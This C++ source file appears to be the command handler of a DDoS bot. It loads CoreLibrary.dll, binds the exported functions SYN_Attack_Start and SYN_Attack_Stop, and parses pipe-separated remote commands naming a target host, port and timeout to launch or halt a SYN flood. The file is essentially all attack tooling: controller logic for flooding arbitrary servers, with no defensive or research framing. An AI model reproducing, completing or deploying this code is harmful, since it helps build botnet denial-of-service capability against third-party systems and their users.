#include "CoreLibraryManager.h"
#include "Command.h"
#include <windows.h>
#include <tchar.h>
#include <vector>


typedef void(__cdecl* SYN_Attack_Stop)();
typedef void(__cdecl* SYN_Attack_Start)(LPWSTR, INT32, INT32);
//typedef LPWSTR(__cdecl* TEST)(LPWSTR, INT32, INT32);

Command ParseCommand(string CommandString);
vector<string> explode(const string& str, const char& ch);

SYN_Attack_Start mSYN_Attack_Start = NULL;
SYN_Attack_Stop mSYN_Attack_Stop = NULL;

HINSTANCE dllHandle = NULL;

CoreLibraryManager::CoreLibraryManager()
{
	LoadCoreLibrary();
}

void CoreLibraryManager::FreeCoreDll()
{
	FreeLibrary(dllHandle);
}
bool CoreLibraryManager::IsCoreDllLoaded()
{
	if (NULL != dllHandle)
	{
		if (mSYN_Attack_Start != NULL && mSYN_Attack_Stop != NULL)
			return true;
	}	
	
	return false;
}



void CoreLibraryManager::LoadCoreLibrary()
{
	BOOL freeResult;

	dllHandle = LoadLibraryA("CoreLibrary.dll");

	if (NULL != dllHandle)
	{
		//Get pointer to our methods using GetProcAddress:
		mSYN_Attack_Start = (SYN_Attack_Start)GetProcAddress(dllHandle, "SYN_Attack_Start");
		mSYN_Attack_Stop = (SYN_Attack_Stop)GetProcAddress(dllHandle, "SYN_Attack_Stop");
	}
}


void CoreLibraryManager::ExecuteCommand(string command)
{
	
	Command cmd = ParseCommand(command);

	if (cmd.Name.compare("Start") == 0)
	{
		int Port = atoi(cmd.Port.c_str());
		int timeout = atoi(cmd.Timeout.c_str());

		wchar_t wtext[20];
		mbstowcs(wtext, cmd.Host.c_str(), strlen(cmd.Host.c_str()) + 1);//Plus null
		LPWSTR Host = wtext;

		if (cmd.AttackIndex.compare("1") == 0)
		{		
			mSYN_Attack_Stop();
			mSYN_Attack_Start(Host, Port, timeout);
		}
	}
	else if (cmd.Name.compare("Start"))
	{
		if (cmd.AttackIndex.compare("1") == 0)
			mSYN_Attack_Stop();
	}
}

Command ParseCommand(string CommandString)
{
	vector<string> rawString = explode(CommandString, '"'); // Clean data from JSON extra characters

	if (rawString.capacity() <= 0)
		return Command();


	vector<string> params = explode(rawString[0], '|');

	int count = 0;
	Command cmd = Command();
	for each (string item in params)
	{
		switch (count)
		{
			case 0:	cmd.Name = item;	break;
			case 1:	cmd.AttackIndex = item;	break;
			case 2:	cmd.Host = item;	break;
			case 3:	cmd.Port = item;	break;
			case 4:	cmd.Timeout = item;	break;

		}
		count++;
	}

	return cmd;
}

vector<string> explode(const string& str, const char& ch) {
	string next;
	vector<string> result;

	// For each character in the string
	for (string::const_iterator it = str.begin(); it != str.end(); it++) {
		// If we've hit the terminal character
		if (*it == ch) {
			// If we have some characters accumulated
			if (!next.empty()) {
				// Add them to the result vector
				result.push_back(next);
				next.clear();
			}
		}
		else {
			// Accumulate the next character into the sequence
			next += *it;
		}
	}
	if (!next.empty())
		result.push_back(next);
	return result;
}

